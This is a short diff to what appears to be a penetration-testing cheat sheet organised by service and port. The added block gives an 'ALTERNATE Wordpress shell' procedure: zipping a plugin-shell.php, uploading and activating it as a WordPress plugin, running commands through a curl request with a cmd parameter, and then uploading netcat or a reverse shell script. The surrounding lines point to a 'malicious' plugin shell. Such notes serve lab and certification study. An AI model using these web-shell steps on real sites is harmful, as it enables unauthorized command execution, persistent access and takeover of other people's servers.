@@ -186,6 +186,15 @@ $ unzip malicious.zip
 # STEP 3: Navigate to [target]/wordpress/wp-content/plugins/malicious/wetw0rk_maybe.php
 ```
 
+ALTERNATE Wordpress shell
+```bash
+$ locate plugin-shell.php
+$ zip plugin-shell.zip plugin-shell.php
+# WP plugins -> add new plugin -> upload zip -> activate plugin
+$ curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
+# upload netcat or reverse shell script and execute.
+```
+
 
 ### POP3 [110 TCP]
 
